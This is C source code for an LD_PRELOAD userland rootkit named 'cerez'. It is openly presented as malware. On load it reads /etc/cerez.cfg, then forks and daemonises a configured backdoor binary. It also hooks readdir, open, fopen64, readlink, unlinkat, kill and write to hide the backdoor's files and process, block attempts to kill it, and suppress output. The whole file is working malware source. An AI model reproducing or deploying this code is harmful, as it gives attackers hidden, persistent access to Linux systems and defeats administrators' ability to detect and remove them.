// cerez rootkit by ngn
// see LICENSE.txt

// loader overwrites the 
// syscalls with LD_PRELOAD

// these new malicious
// syscalls make sure our
// rootkit won't be found 

#define _GNU_SOURCE

#include "util.c"

#include <dirent.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>          
#include <sys/stat.h>
#include <stdarg.h>
#include "errno.h"

char *CONFIG_FILE = "/etc/cerez.cfg";
struct cfg{
  char* backdoor[200];
  char* whitelist[200];
  char* hidden[500]; 
  int hiddensize;
  int output;
  int found;
};

struct cfg config;
struct proc process;
int am_i_backdoor = 0;

int read_cfg(){
  FILE *fd = ofopen(CONFIG_FILE, "r");

  if(fd==NULL){
    debug("cant read config\n");
    return 1;
  }

  char buffer[128];
  char split = ':';
  int hindex = 0; 
  while((fgets(buffer, 128, fd))!= NULL) {
    char* clean = replace(buffer, '\n', '\0', strlen(buffer));  
    char* key = strtok(clean, &split);
    char* value = strtok(NULL, &split);
   
    if(key==NULL && value==NULL){
      continue;
    }

    if(strstr(key, "backdoor")){
      strcpy((char *)config.backdoor, value);
    }

    if(strstr(key, "whitelist")){
      strcpy((char*)config.whitelist, value);
    }

    if(strstr(key, "output")){
      if(strstr(value, "1"))
        config.output = 1;
      else
        config.output = 0;
    }

    else{
      sprintf((char *)config.hidden, "%s %s", (char *)config.hidden, key);
    }
    
    hindex += 1;
  }

  fclose(fd);
  config.hiddensize = hindex;
  return 0;
};

int is_backdoor(){
  FILE *fd = ofopen("/proc/self/cmdline", "r");

  if(fd==NULL){
    debug("cant read /proc/self/cmdline\n");
    return 1;
  }

  char buffer[250];
  ssize_t len = fread(buffer, 1, sizeof(buffer)-1, fd);
  char* self = replace(buffer, '\0', ' ', len);
  fclose(fd);

  if(strstr((char *)config.backdoor, self)){
    return 1;
  }

  return 0;
}

void _init() {
  // some defaults
  config.found = 0;
  config.output = 0;
  get_originals();
  
  am_i_backdoor = is_backdoor();
  if(am_i_backdoor==1){
    return;
  }
 
  if(read_cfg()==1){
    return;
  }
 
  config.found = 1;
  // we need to make sure that our 
	// backdoor is not already running
	// if so we can start it up
  process = find_proc((char *)config.backdoor);
  if(process.alive){
		return;
  }
	
	// to start the backdoor 
	// first fork the current
	// process creating a 
	// new child process
	pid_t fpid = fork();
	
  // if pid is set to -1
	// it means child
	// process creation failed
	if (fpid == 0){	
    // if not failed,
		// first we create a
		// daemon, 0 means
		// child process should
		// change dir to root dir,
		// the other 0 means 
		// child processes std in/out
		// will be redirected
		// to /dev/null
		daemon(0,0);
		// then we execute the backdoor
		// replacing the process
		execve((char *)config.backdoor, NULL, NULL);
		// if execve fails, we just exit
		exit(0);  
	}

	return;
}

bool path_check(const char* pathname){
  if(strstr(pathname, (char *)config.whitelist)){
    debug("check passed - whitelist");
    return true;
  }

  if(am_i_backdoor==1){
    debug("check passed - im the backdoor");
    return true;
  }

  if(config.found==0){
    debug("check passed - cfg not found");
    return true;
  }

	// if(strstr(pathname, "/proc/net/tcp")!=NULL)	
	//	return false;
  
  char fpathname[80];
  sprintf(fpathname, " %s ", pathname);
  if(strstr((char *)config.hidden, fpathname)){
    debug("check failed - hidden file");
    return false;
  }

	char pid[30];	
	sprintf(pid, "%d", process.pid);
	if(strstr(pathname, pid)){
    debug("check failed - process file");
    return false;
  }

	return true;
}

// malicious syscalls
struct dirent *readdir(DIR *dirp){
	struct dirent *dp = oreaddir(dirp);
		
	while(dp != NULL && (!path_check(dp->d_name))){
			dp = oreaddir(dirp);
	}

	return dp;
}

ssize_t readlink(const char *restrict pathname, char *restrict buf, size_t bufsiz){
	if(!path_check(pathname))
		return -1;
	
	return oreadlink(pathname, buf, bufsiz);
}


FILE* fopen64(const char *restrict pathname, const char *restrict mode){
	if(!path_check(pathname))
		return NULL;

	return ofopen(pathname, mode);	
}

int open(const char *pathname, int flags, ...){
	if(!path_check(pathname))
		return -1;

	// so you might be thinking,
	// how do you pass the "..."
	
	// well idk

	// so i found a easier
	// solution

	// i dont
	return oopen(pathname, flags);
	// this is probably not a good idea
}

int unlinkat(int dirfd, const char *pathname, int flags){
	if(!path_check(pathname))
		return -1;

	return ounlinkat(dirfd, pathname, flags);
}

int kill(pid_t pid, int sig){
  if(process.alive && pid == process.pid){
    errno = ESRCH;
    return -1;
  }

  return okill(pid, sig);
}

ssize_t write(int fd, const void *buf, size_t count){
  if(am_i_backdoor==1 || config.output==0 || path_check(buf)){
    return owrite(fd, buf, count);
  }
  
  errno = EBADF;
  return -1;
}
